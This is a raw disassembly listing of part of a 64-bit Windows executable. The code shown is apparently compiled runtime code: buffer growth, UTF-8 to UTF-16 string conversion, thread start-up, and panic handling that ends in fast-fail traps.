   140003e5c:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140003e60:	4c 8d 0c 00          	lea    (%rax,%rax,1),%r9
   140003e64:	49 39 c9             	cmp    %rcx,%r9
   140003e67:	49 0f 47 c9          	cmova  %r9,%rcx
   140003e6b:	48 83 f9 05          	cmp    $0x5,%rcx
   140003e6f:	bf 04 00 00 00       	mov    $0x4,%edi
   140003e74:	48 0f 43 f9          	cmovae %rcx,%rdi
   140003e78:	31 c9                	xor    %ecx,%ecx
   140003e7a:	48 85 ff             	test   %rdi,%rdi
   140003e7d:	78 70                	js     0x140003eef
   140003e7f:	4c 8d 04 3f          	lea    (%rdi,%rdi,1),%r8
   140003e83:	49 ba fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r10
   140003e8a:	ff ff 7f 
   140003e8d:	4d 39 d0             	cmp    %r10,%r8
   140003e90:	77 58                	ja     0x140003eea
   140003e92:	48 85 c0             	test   %rax,%rax
   140003e95:	74 13                	je     0x140003eaa
   140003e97:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140003e9b:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140003e9f:	4c 89 4d e0          	mov    %r9,-0x20(%rbp)
   140003ea3:	b8 02 00 00 00       	mov    $0x2,%eax
   140003ea8:	eb 02                	jmp    0x140003eac
   140003eaa:	31 c0                	xor    %eax,%eax
   140003eac:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140003eb0:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140003eb4:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140003eb8:	ba 02 00 00 00       	mov    $0x2,%edx
   140003ebd:	e8 9e fd ff ff       	call   0x140003c60
   140003ec2:	83 7d e8 01          	cmpl   $0x1,-0x18(%rbp)
   140003ec6:	74 1a                	je     0x140003ee2
   140003ec8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003ecc:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140003ed0:	48 89 3e             	mov    %rdi,(%rsi)
   140003ed3:	48 83 c4 50          	add    $0x50,%rsp
   140003ed7:	5f                   	pop    %rdi
   140003ed8:	5e                   	pop    %rsi
   140003ed9:	5d                   	pop    %rbp
   140003eda:	c3                   	ret
   140003edb:	31 c9                	xor    %ecx,%ecx
   140003edd:	e8 63 77 01 00       	call   0x14001b645
   140003ee2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003ee6:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140003eea:	e8 56 77 01 00       	call   0x14001b645
   140003eef:	e8 51 77 01 00       	call   0x14001b645
   140003ef4:	cc                   	int3
   140003ef5:	cc                   	int3
   140003ef6:	cc                   	int3
   140003ef7:	cc                   	int3
   140003ef8:	cc                   	int3
   140003ef9:	cc                   	int3
   140003efa:	cc                   	int3
   140003efb:	cc                   	int3
   140003efc:	cc                   	int3
   140003efd:	cc                   	int3
   140003efe:	cc                   	int3
   140003eff:	cc                   	int3
   140003f00:	55                   	push   %rbp
   140003f01:	48 89 e5             	mov    %rsp,%rbp
   140003f04:	49 89 d0             	mov    %rdx,%r8
   140003f07:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140003f0b:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140003f0f:	48 89 c1             	mov    %rax,%rcx
   140003f12:	5d                   	pop    %rbp
   140003f13:	e9 38 35 01 00       	jmp    0x140017450
   140003f18:	cc                   	int3
   140003f19:	cc                   	int3
   140003f1a:	cc                   	int3
   140003f1b:	cc                   	int3
   140003f1c:	cc                   	int3
   140003f1d:	cc                   	int3
   140003f1e:	cc                   	int3
   140003f1f:	cc                   	int3
   140003f20:	55                   	push   %rbp
   140003f21:	48 83 ec 60          	sub    $0x60,%rsp
   140003f25:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   140003f2a:	48 89 d0             	mov    %rdx,%rax
   140003f2d:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140003f31:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140003f35:	48 8d 15 64 ea 06 00 	lea    0x6ea64(%rip),%rdx        # 0x1400729a0
   140003f3c:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   140003f41:	48 8d 55 f8          	lea    -0x8(%rbp),%rdx
   140003f45:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140003f4a:	48 8d 15 83 ea 06 00 	lea    0x6ea83(%rip),%rdx        # 0x1400729d4
   140003f51:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140003f56:	48 8d 15 23 ea 06 00 	lea    0x6ea23(%rip),%rdx        # 0x140072980
   140003f5d:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140003f62:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f67:	48 c7 44 24 40 09 00 	movq   $0x9,0x40(%rsp)
   140003f6e:	00 00 
   140003f70:	48 c7 44 24 20 0b 00 	movq   $0xb,0x20(%rsp)
   140003f77:	00 00 
   140003f79:	48 8d 15 40 ea 06 00 	lea    0x6ea40(%rip),%rdx        # 0x1400729c0
   140003f80:	4c 8d 0d 42 ea 06 00 	lea    0x6ea42(%rip),%r9        # 0x1400729c9
   140003f87:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   140003f8d:	48 89 c1             	mov    %rax,%rcx
   140003f90:	e8 bb 2e 01 00       	call   0x140016e50
   140003f95:	90                   	nop
   140003f96:	48 83 c4 60          	add    $0x60,%rsp
   140003f9a:	5d                   	pop    %rbp
   140003f9b:	c3                   	ret
   140003f9c:	cc                   	int3
   140003f9d:	cc                   	int3
   140003f9e:	cc                   	int3
   140003f9f:	cc                   	int3
   140003fa0:	55                   	push   %rbp
   140003fa1:	48 83 ec 30          	sub    $0x30,%rsp
   140003fa5:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003faa:	48 89 d0             	mov    %rdx,%rax
   140003fad:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
   140003fb1:	48 8d 0d 30 ea 06 00 	lea    0x6ea30(%rip),%rcx        # 0x1400729e8
   140003fb8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003fbd:	48 8d 15 44 ea 06 00 	lea    0x6ea44(%rip),%rdx        # 0x140072a08
   140003fc4:	4c 8d 4d f8          	lea    -0x8(%rbp),%r9
   140003fc8:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003fce:	48 89 c1             	mov    %rax,%rcx
   140003fd1:	e8 ba 2f 01 00       	call   0x140016f90
   140003fd6:	90                   	nop
   140003fd7:	48 83 c4 30          	add    $0x30,%rsp
   140003fdb:	5d                   	pop    %rbp
   140003fdc:	c3                   	ret
   140003fdd:	cc                   	int3
   140003fde:	cc                   	int3
   140003fdf:	cc                   	int3
   140003fe0:	55                   	push   %rbp
   140003fe1:	41 57                	push   %r15
   140003fe3:	41 56                	push   %r14
   140003fe5:	41 55                	push   %r13
   140003fe7:	41 54                	push   %r12
   140003fe9:	56                   	push   %rsi
   140003fea:	57                   	push   %rdi
   140003feb:	53                   	push   %rbx
   140003fec:	48 83 ec 28          	sub    $0x28,%rsp
   140003ff0:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140003ff5:	48 89 d6             	mov    %rdx,%rsi
   140003ff8:	48 89 cf             	mov    %rcx,%rdi
   140003ffb:	44 0f b7 62 10       	movzwl 0x10(%rdx),%r12d
   140004000:	4c 8b 2a             	mov    (%rdx),%r13
   140004003:	4c 8b 72 08          	mov    0x8(%rdx),%r14
   140004007:	eb 2f                	jmp    0x140004038
   140004009:	c1 e1 06             	shl    $0x6,%ecx
   14000400c:	44 09 c1             	or     %r8d,%ecx
   14000400f:	41 89 cc             	mov    %ecx,%r12d
   140004012:	45 31 ff             	xor    %r15d,%r15d
   140004015:	49 89 c5             	mov    %rax,%r13
   140004018:	48 8b 5f 10          	mov    0x10(%rdi),%rbx
   14000401c:	48 3b 1f             	cmp    (%rdi),%rbx
   14000401f:	0f 84 fe 00 00 00    	je     0x140004123
   140004025:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004029:	66 44 89 24 58       	mov    %r12w,(%rax,%rbx,2)
   14000402e:	48 ff c3             	inc    %rbx
   140004031:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140004035:	45 89 fc             	mov    %r15d,%r12d
   140004038:	66 45 85 e4          	test   %r12w,%r12w
   14000403c:	0f 85 8e 00 00 00    	jne    0x1400040d0
   140004042:	4d 39 f5             	cmp    %r14,%r13
   140004045:	0f 84 1d 01 00 00    	je     0x140004168
   14000404b:	49 8d 45 01          	lea    0x1(%r13),%rax
   14000404f:	48 89 06             	mov    %rax,(%rsi)
   140004052:	41 0f b6 55 00       	movzbl 0x0(%r13),%edx
   140004057:	44 0f b6 e2          	movzbl %dl,%r12d
   14000405b:	45 84 e4             	test   %r12b,%r12b
   14000405e:	79 b2                	jns    0x140004012
   140004060:	44 89 e1             	mov    %r12d,%ecx
   140004063:	83 e1 1f             	and    $0x1f,%ecx
   140004066:	49 8d 45 02          	lea    0x2(%r13),%rax
   14000406a:	48 89 06             	mov    %rax,(%rsi)
   14000406d:	45 0f b6 45 01       	movzbl 0x1(%r13),%r8d
   140004072:	41 83 e0 3f          	and    $0x3f,%r8d
   140004076:	41 80 fc df          	cmp    $0xdf,%r12b
   14000407a:	76 8d                	jbe    0x140004009
   14000407c:	49 8d 45 03          	lea    0x3(%r13),%rax
   140004080:	48 89 06             	mov    %rax,(%rsi)
   140004083:	45 0f b6 65 02       	movzbl 0x2(%r13),%r12d
   140004088:	41 c1 e0 06          	shl    $0x6,%r8d
   14000408c:	41 83 e4 3f          	and    $0x3f,%r12d
   140004090:	45 09 c4             	or     %r8d,%r12d
   140004093:	80 fa f0             	cmp    $0xf0,%dl
   140004096:	72 46                	jb     0x1400040de
   140004098:	49 8d 45 04          	lea    0x4(%r13),%rax
   14000409c:	48 89 06             	mov    %rax,(%rsi)
   14000409f:	41 0f b6 55 03       	movzbl 0x3(%r13),%edx
   1400040a4:	83 e1 07             	and    $0x7,%ecx
   1400040a7:	c1 e1 12             	shl    $0x12,%ecx
   1400040aa:	41 c1 e4 06          	shl    $0x6,%r12d
   1400040ae:	83 e2 3f             	and    $0x3f,%edx
   1400040b1:	44 09 e2             	or     %r12d,%edx
   1400040b4:	09 ca                	or     %ecx,%edx
   1400040b6:	41 89 d4             	mov    %edx,%r12d
   1400040b9:	41 81 fc ff ff 00 00 	cmp    $0xffff,%r12d
   1400040c0:	0f 86 4c ff ff ff    	jbe    0x140004012
   1400040c6:	eb 29                	jmp    0x1400040f1
   1400040c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400040cf:	00 
   1400040d0:	66 c7 46 10 00 00    	movw   $0x0,0x10(%rsi)
   1400040d6:	45 31 ff             	xor    %r15d,%r15d
   1400040d9:	e9 3a ff ff ff       	jmp    0x140004018
   1400040de:	c1 e1 0c             	shl    $0xc,%ecx
   1400040e1:	41 09 cc             	or     %ecx,%r12d
   1400040e4:	41 81 fc ff ff 00 00 	cmp    $0xffff,%r12d
   1400040eb:	0f 86 21 ff ff ff    	jbe    0x140004012
   1400040f1:	41 8d 8c 24 00 00 ff 	lea    0xff0000(%r12),%ecx
   1400040f8:	00 
   1400040f9:	c1 e9 0a             	shr    $0xa,%ecx
   1400040fc:	81 c9 00 d8 00 00    	or     $0xd800,%ecx
   140004102:	41 81 e4 ff 03 00 00 	and    $0x3ff,%r12d
   140004109:	41 81 cc 00 dc 00 00 	or     $0xdc00,%r12d
   140004110:	66 44 89 66 10       	mov    %r12w,0x10(%rsi)
   140004115:	49 89 c5             	mov    %rax,%r13
   140004118:	45 89 e7             	mov    %r12d,%r15d
   14000411b:	41 89 cc             	mov    %ecx,%r12d
   14000411e:	e9 f5 fe ff ff       	jmp    0x140004018
   140004123:	4d 89 f0             	mov    %r14,%r8
   140004126:	4d 29 e8             	sub    %r13,%r8
   140004129:	49 83 c0 03          	add    $0x3,%r8
   14000412d:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140004134:	4c 0f 42 c0          	cmovb  %rax,%r8
   140004138:	49 c1 e8 02          	shr    $0x2,%r8
   14000413c:	66 41 83 ff 01       	cmp    $0x1,%r15w
   140004141:	49 83 d8 00          	sbb    $0x0,%r8
   140004145:	49 83 c0 02          	add    $0x2,%r8
   140004149:	48 c7 44 24 20 02 00 	movq   $0x2,0x20(%rsp)
   140004150:	00 00 
   140004152:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140004158:	48 89 f9             	mov    %rdi,%rcx
   14000415b:	48 89 da             	mov    %rbx,%rdx
   14000415e:	e8 7d 69 01 00       	call   0x14001aae0
   140004163:	e9 bd fe ff ff       	jmp    0x140004025
   140004168:	48 83 c4 28          	add    $0x28,%rsp
   14000416c:	5b                   	pop    %rbx
   14000416d:	5f                   	pop    %rdi
   14000416e:	5e                   	pop    %rsi
   14000416f:	41 5c                	pop    %r12
   140004171:	41 5d                	pop    %r13
   140004173:	41 5e                	pop    %r14
   140004175:	41 5f                	pop    %r15
   140004177:	5d                   	pop    %rbp
   140004178:	c3                   	ret
   140004179:	cc                   	int3
   14000417a:	cc                   	int3
   14000417b:	cc                   	int3
   14000417c:	cc                   	int3
   14000417d:	cc                   	int3
   14000417e:	cc                   	int3
   14000417f:	cc                   	int3
   140004180:	55                   	push   %rbp
   140004181:	48 83 ec 40          	sub    $0x40,%rsp
   140004185:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000418a:	8b 05 64 7f 07 00    	mov    0x77f64(%rip),%eax        # 0x14007c0f4
   140004190:	83 f8 03             	cmp    $0x3,%eax
   140004193:	75 06                	jne    0x14000419b
   140004195:	48 83 c4 40          	add    $0x40,%rsp
   140004199:	5d                   	pop    %rbp
   14000419a:	c3                   	ret
   14000419b:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
   14000419f:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   1400041a3:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400041a7:	48 8d 05 5a ea 06 00 	lea    0x6ea5a(%rip),%rax        # 0x140072c08
   1400041ae:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400041b3:	48 8d 0d 3a 7f 07 00 	lea    0x77f3a(%rip),%rcx        # 0x14007c0f4
   1400041ba:	4c 8d 0d 87 f4 06 00 	lea    0x6f487(%rip),%r9        # 0x140073648
   1400041c1:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1400041c5:	31 d2                	xor    %edx,%edx
   1400041c7:	e8 d4 6e 01 00       	call   0x14001b0a0
   1400041cc:	90                   	nop
   1400041cd:	48 83 c4 40          	add    $0x40,%rsp
   1400041d1:	5d                   	pop    %rbp
   1400041d2:	c3                   	ret
   1400041d3:	cc                   	int3
   1400041d4:	cc                   	int3
   1400041d5:	cc                   	int3
   1400041d6:	cc                   	int3
   1400041d7:	cc                   	int3
   1400041d8:	cc                   	int3
   1400041d9:	cc                   	int3
   1400041da:	cc                   	int3
   1400041db:	cc                   	int3
   1400041dc:	cc                   	int3
   1400041dd:	cc                   	int3
   1400041de:	cc                   	int3
   1400041df:	cc                   	int3
   1400041e0:	55                   	push   %rbp
   1400041e1:	41 57                	push   %r15
   1400041e3:	41 56                	push   %r14
   1400041e5:	56                   	push   %rsi
   1400041e6:	57                   	push   %rdi
   1400041e7:	53                   	push   %rbx
   1400041e8:	48 81 ec f8 00 00 00 	sub    $0xf8,%rsp
   1400041ef:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400041f6:	00 
   1400041f7:	48 c7 45 50 fe ff ff 	movq   $0xfffffffffffffffe,0x50(%rbp)
   1400041fe:	ff 
   1400041ff:	48 89 d6             	mov    %rdx,%rsi
   140004202:	48 89 cf             	mov    %rcx,%rdi
   140004205:	48 8d 15 94 86 00 00 	lea    0x8694(%rip),%rdx        # 0x14000c8a0
   14000420c:	31 c9                	xor    %ecx,%ecx
   14000420e:	ff 15 2c 7e 01 00    	call   *0x17e2c(%rip)        # 0x14001c040
   140004214:	c7 45 e0 00 50 00 00 	movl   $0x5000,-0x20(%rbp)
   14000421b:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000421f:	ff 15 23 7e 01 00    	call   *0x17e23(%rip)        # 0x14001c048
   140004225:	ff 15 25 7e 01 00    	call   *0x17e25(%rip)        # 0x14001c050
   14000422b:	4c 8b 05 f6 7d 07 00 	mov    0x77df6(%rip),%r8        # 0x14007c028
   140004232:	48 8d 15 37 04 07 00 	lea    0x70437(%rip),%rdx        # 0x140074670
   140004239:	48 89 c1             	mov    %rax,%rcx
   14000423c:	41 ff d0             	call   *%r8
   14000423f:	8b 05 f3 7f 07 00    	mov    0x77ff3(%rip),%eax        # 0x14007c238
   140004245:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   14000424c:	00 00 
   14000424e:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140004252:	4c 8b b8 08 00 00 00 	mov    0x8(%rax),%r15
   140004259:	4d 85 ff             	test   %r15,%r15
   14000425c:	75 45                	jne    0x1400042a3
   14000425e:	48 8b 05 43 7f 07 00 	mov    0x77f43(%rip),%rax        # 0x14007c1a8
   140004265:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000426c:	00 00 00 00 
   140004270:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004274:	0f 84 d4 01 00 00    	je     0x14000444e
   14000427a:	4c 8d 78 01          	lea    0x1(%rax),%r15
   14000427e:	f0 4c 0f b1 3d 21 7f 	lock cmpxchg %r15,0x77f21(%rip)        # 0x14007c1a8
   140004285:	07 00 
   140004287:	75 e7                	jne    0x140004270
   140004289:	8b 05 a9 7f 07 00    	mov    0x77fa9(%rip),%eax        # 0x14007c238
   14000428f:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   140004296:	00 00 
   140004298:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000429c:	4c 89 b8 08 00 00 00 	mov    %r15,0x8(%rax)
   1400042a3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400042a8:	ba 28 00 00 00       	mov    $0x28,%edx
   1400042ad:	e8 4e 12 01 00       	call   0x140015500
   1400042b2:	49 89 c6             	mov    %rax,%r14
   1400042b5:	48 89 d3             	mov    %rdx,%rbx
   1400042b8:	48 85 d2             	test   %rdx,%rdx
   1400042bb:	0f 84 da 00 00 00    	je     0x14000439b
   1400042c1:	0f b6 05 29 7e 07 00 	movzbl 0x77e29(%rip),%eax        # 0x14007c0f1
   1400042c8:	48 89 d9             	mov    %rbx,%rcx
   1400042cb:	4c 89 f2             	mov    %r14,%rdx
   1400042ce:	e8 ed da ff ff       	call   0x140001dc0
   1400042d3:	48 89 c2             	mov    %rax,%rdx
   1400042d6:	48 85 d2             	test   %rdx,%rdx
   1400042d9:	0f 84 c8 00 00 00    	je     0x1400043a7
   1400042df:	48 c7 02 01 00 00 00 	movq   $0x1,(%rdx)
   1400042e6:	48 c7 42 08 01 00 00 	movq   $0x1,0x8(%rdx)
   1400042ed:	00 
   1400042ee:	48 c7 42 10 00 00 00 	movq   $0x0,0x10(%rdx)
   1400042f5:	00 
   1400042f6:	4c 89 7a 28          	mov    %r15,0x28(%rdx)
   1400042fa:	c6 42 30 00          	movb   $0x0,0x30(%rdx)
   1400042fe:	8b 05 34 7f 07 00    	mov    0x77f34(%rip),%eax        # 0x14007c238
   140004304:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   14000430b:	00 00 
   14000430d:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140004311:	48 83 b8 50 00 00 00 	cmpq   $0x0,0x50(%rax)
   140004318:	00 
   140004319:	75 28                	jne    0x140004343
   14000431b:	8b 05 17 7f 07 00    	mov    0x77f17(%rip),%eax        # 0x14007c238
   140004321:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   140004328:	00 00 
   14000432a:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000432e:	48 8b 80 08 00 00 00 	mov    0x8(%rax),%rax
   140004335:	48 85 c0             	test   %rax,%rax
   140004338:	74 7d                	je     0x1400043b7
   14000433a:	4c 39 f8             	cmp    %r15,%rax
   14000433d:	0f 84 8e 00 00 00    	je     0x1400043d1
   140004343:	48 89 55 40          	mov    %rdx,0x40(%rbp)
   140004347:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000434b:	c7 45 18 00 00 00 00 	movl   $0x0,0x18(%rbp)
   140004352:	c6 45 1c 00          	movb   $0x0,0x1c(%rbp)
   140004356:	48 8d 05 8b e8 06 00 	lea    0x6e88b(%rip),%rax        # 0x140072be8
   14000435d:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004361:	48 c7 45 e8 01 00 00 	movq   $0x1,-0x18(%rbp)
   140004368:	00 
   140004369:	48 8d 45 48          	lea    0x48(%rbp),%rax
   14000436d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004371:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004374:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   140004378:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000437c:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004380:	e8 9b 26 00 00       	call   0x140006a20
   140004385:	48 89 45 38          	mov    %rax,0x38(%rbp)
   140004389:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   14000438d:	e8 3e ec ff ff       	call   0x140002fd0
   140004392:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004397:	cd 29                	int    $0x29
   140004399:	0f 0b                	ud2
   14000439b:	4c 89 f2             	mov    %r14,%rdx
   14000439e:	48 85 d2             	test   %rdx,%rdx
   1400043a1:	0f 85 38 ff ff ff    	jne    0x1400042df
   1400043a7:	4c 89 f1             	mov    %r14,%rcx
   1400043aa:	48 89 da             	mov    %rbx,%rdx
   1400043ad:	e8 ad 72 01 00       	call   0x14001b65f
   1400043b2:	e9 9c 00 00 00       	jmp    0x140004453
   1400043b7:	8b 05 7b 7e 07 00    	mov    0x77e7b(%rip),%eax        # 0x14007c238
   1400043bd:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   1400043c4:	00 00 
   1400043c6:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   1400043ca:	4c 89 b8 08 00 00 00 	mov    %r15,0x8(%rax)
   1400043d1:	48 83 c2 10          	add    $0x10,%rdx
   1400043d5:	48 8b 05 74 7f 01 00 	mov    0x17f74(%rip),%rax        # 0x14001c350
   1400043dc:	8b 05 56 7e 07 00    	mov    0x77e56(%rip),%eax        # 0x14007c238
   1400043e2:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   1400043e9:	00 00 
   1400043eb:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   1400043ef:	48 89 90 50 00 00 00 	mov    %rdx,0x50(%rax)
   1400043f6:	48 89 f9             	mov    %rdi,%rcx
   1400043f9:	ff 56 28             	call   *0x28(%rsi)
   1400043fc:	48 63 f0             	movslq %eax,%rsi
   1400043ff:	8b 05 ef 7c 07 00    	mov    0x77cef(%rip),%eax        # 0x14007c0f4
   140004405:	83 f8 03             	cmp    $0x3,%eax
   140004408:	74 31                	je     0x14000443b
   14000440a:	c6 45 10 01          	movb   $0x1,0x10(%rbp)
   14000440e:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004412:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140004416:	48 8d 05 eb e7 06 00 	lea    0x6e7eb(%rip),%rax        # 0x140072c08
   14000441d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004422:	48 8d 0d cb 7c 07 00 	lea    0x77ccb(%rip),%rcx        # 0x14007c0f4
   140004429:	4c 8d 0d 18 f2 06 00 	lea    0x6f218(%rip),%r9        # 0x140073648
   140004430:	4c 8d 45 b0          	lea    -0x50(%rbp),%r8
   140004434:	31 d2                	xor    %edx,%edx
   140004436:	e8 65 6c 01 00       	call   0x14001b0a0
   14000443b:	48 89 f0             	mov    %rsi,%rax
   14000443e:	48 81 c4 f8 00 00 00 	add    $0xf8,%rsp
   140004445:	5b                   	pop    %rbx
   140004446:	5f                   	pop    %rdi
   140004447:	5e                   	pop    %rsi
   140004448:	41 5e                	pop    %r14
   14000444a:	41 5f                	pop    %r15
   14000444c:	5d                   	pop    %rbp
   14000444d:	c3                   	ret
   14000444e:	e8 1d 69 01 00       	call   0x14001ad70
   140004453:	0f 0b                	ud2
   140004455:	c7 45 28 00 00 00 00 	movl   $0x0,0x28(%rbp)
   14000445c:	c6 45 2c 00          	movb   $0x0,0x2c(%rbp)
   140004460:	48 8d 05 21 e7 06 00 	lea    0x6e721(%rip),%rax        # 0x140072b88
   140004467:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000446b:	48 c7 45 e8 01 00 00 	movq   $0x1,-0x18(%rbp)
   140004472:	00 
   140004473:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004477:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000447b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000447e:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   140004482:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   140004486:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000448a:	e8 91 25 00 00       	call   0x140006a20
   14000448f:	48 89 45 38          	mov    %rax,0x38(%rbp)
   140004493:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   140004497:	e8 34 eb ff ff       	call   0x140002fd0
   14000449c:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400044a1:	cd 29                	int    $0x29
   1400044a3:	0f 0b                	ud2
   1400044a5:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400044a9:	48 8b 00             	mov    (%rax),%rax
   1400044ac:	48 85 c0             	test   %rax,%rax
   1400044af:	74 06                	je     0x1400044b7
   1400044b1:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400044b5:	ff d0                	call   *%rax
   1400044b7:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400044bb:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400044bf:	be 65 00 00 00       	mov    $0x65,%esi
   1400044c4:	48 85 d2             	test   %rdx,%rdx
   1400044c7:	0f 84 32 ff ff ff    	je     0x1400043ff
   1400044cd:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400044d1:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400044d5:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400044d9:	e8 f2 d8 ff ff       	call   0x140001dd0
   1400044de:	e9 1c ff ff ff       	jmp    0x1400043ff
   1400044e3:	c7 45 38 00 00 00 00 	movl   $0x0,0x38(%rbp)
   1400044ea:	c6 45 3c 00          	movb   $0x0,0x3c(%rbp)
   1400044ee:	48 8d 05 63 e7 06 00 	lea    0x6e763(%rip),%rax        # 0x140072c58
   1400044f5:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400044f9:	48 c7 45 e8 01 00 00 	movq   $0x1,-0x18(%rbp)
   140004500:	00 
   140004501:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004505:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004509:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000450c:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   140004510:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   140004514:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004518:	e8 03 25 00 00       	call   0x140006a20
   14000451d:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140004521:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004525:	e8 a6 ea ff ff       	call   0x140002fd0
   14000452a:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000452f:	cd 29                	int    $0x29
   140004531:	0f 0b                	ud2
   140004533:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000453a:	c6 45 24 00          	movb   $0x0,0x24(%rbp)
   14000453e:	48 8d 05 43 e6 06 00 	lea    0x6e643(%rip),%rax        # 0x140072b88
   140004545:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140004549:	48 c7 45 b8 01 00 00 	movq   $0x1,-0x48(%rbp)
   140004550:	00 
   140004551:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004555:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140004559:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000455c:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   140004560:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140004564:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140004568:	e8 b3 24 00 00       	call   0x140006a20
   14000456d:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140004571:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004575:	e8 56 ea ff ff       	call   0x140002fd0
   14000457a:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000457f:	cd 29                	int    $0x29
   140004581:	0f 0b                	ud2
   140004583:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000458a:	84 00 00 00 00 00 
   140004590:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004595:	55                   	push   %rbp
   140004596:	41 57                	push   %r15
   140004598:	41 56                	push   %r14
   14000459a:	56                   	push   %rsi
   14000459b:	57                   	push   %rdi
   14000459c:	53                   	push   %rbx
   14000459d:	48 83 ec 28          	sub    $0x28,%rsp
